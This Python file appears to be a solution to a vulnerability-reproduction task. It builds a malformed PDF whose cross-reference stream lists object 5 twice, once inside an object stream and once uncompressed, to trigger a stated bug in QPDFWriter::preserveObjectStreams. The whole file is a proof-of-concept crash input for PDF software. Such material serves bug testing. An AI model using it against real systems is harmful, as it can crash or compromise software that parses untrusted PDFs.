import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PDF with an Object Stream and duplicate XRef entries for an object inside it.
        # This targets the QPDFWriter::preserveObjectStreams bug where duplicate IDs cause cache deletion.
        
        # Header
        header = b"%PDF-1.7\n%\x80\x80\x80\x80\n"
        
        # Obj 1: Catalog
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # Obj 2: Pages
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Obj 3: Page with reference to Obj 5 to ensure it is processed
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 800] /Annots [ 5 0 R ] >>\nendobj\n"
        
        # Obj 4: ObjStm containing Obj 5
        # Content: "5 0 << /Type /Annot >>"
        # "5 0 " is 4 bytes, so First offset is 4.
        stm_content = b"5 0 << /Type /Annot >>"
        obj4_start = b"4 0 obj\n<< /Type /ObjStm /N 1 /First 4 >>\nstream\n"
        obj4_end = b"\nendstream\nendobj\n"
        obj4 = obj4_start + stm_content + obj4_end
        
        # Obj 5: Duplicate definition (Uncompressed)
        # This provides the conflicting definition for the same object ID.
        obj5 = b"5 0 obj\n<< /Duplicate /True >>\nendobj\n"
        
        # Calculate offsets
        current_offset = len(header)
        
        off1 = current_offset
        current_offset += len(obj1)
        
        off2 = current_offset
        current_offset += len(obj2)
        
        off3 = current_offset
        current_offset += len(obj3)
        
        off4 = current_offset
        current_offset += len(obj4)
        
        off5 = current_offset
        current_offset += len(obj5)
        
        off6 = current_offset # XRef stream starts here
        
        # Construct XRef Stream Data
        # We use W = [1, 2, 1] => 1 byte type, 2 bytes offset/val, 1 byte gen/index
        def pack_entry(t, f2, f3):
            return struct.pack('>BHB', t, f2, f3)
            
        # We define two ranges in /Index to create duplicate entries.
        # Range 1: [0 7] -> Objects 0, 1, 2, 3, 4, 5, 6
        # Range 2: [5 1] -> Object 5 again
        
        # 0: Free
        d0 = pack_entry(0, 0, 0)
        # 1: Obj 1 (Offset)
        d1 = pack_entry(1, off1, 0)
        # 2: Obj 2 (Offset)
        d2 = pack_entry(1, off2, 0)
        # 3: Obj 3 (Offset)
        d3 = pack_entry(1, off3, 0)
        # 4: Obj 4 (Offset) - The ObjStm
        d4 = pack_entry(1, off4, 0)
        # 5: Obj 5 (Compressed in Stream 4) -> Type 2, Stream 4, Index 0
        d5_comp = pack_entry(2, 4, 0)
        # 6: Obj 6 (Offset) - The XRef stream
        d6 = pack_entry(1, off6, 0)
        
        # Duplicate 5: Obj 5 (Uncompressed Offset) -> Type 1
        d5_dup = pack_entry(1, off5, 0)
        
        xref_data = d0 + d1 + d2 + d3 + d4 + d5_comp + d6 + d5_dup
        
        # Obj 6 definition (XRef Stream)
        # Size 7 covers 0-6. Index [0 7 5 1] specifies the entries.
        obj6_start = (b"6 0 obj\n<< /Type /XRef /Size 7 /W [ 1 2 1 ] /Index [ 0 7 5 1 ] "
                      b"/Root 1 0 R >>\nstream\n")
        obj6_end = b"\nendstream\nendobj\n"
        obj6 = obj6_start + xref_data + obj6_end
        
        # Footer
        footer = b"startxref\n" + str(off6).encode('ascii') + b"\n%%EOF\n"
        
        return header + obj1 + obj2 + obj3 + obj4 + obj5 + obj6 + footer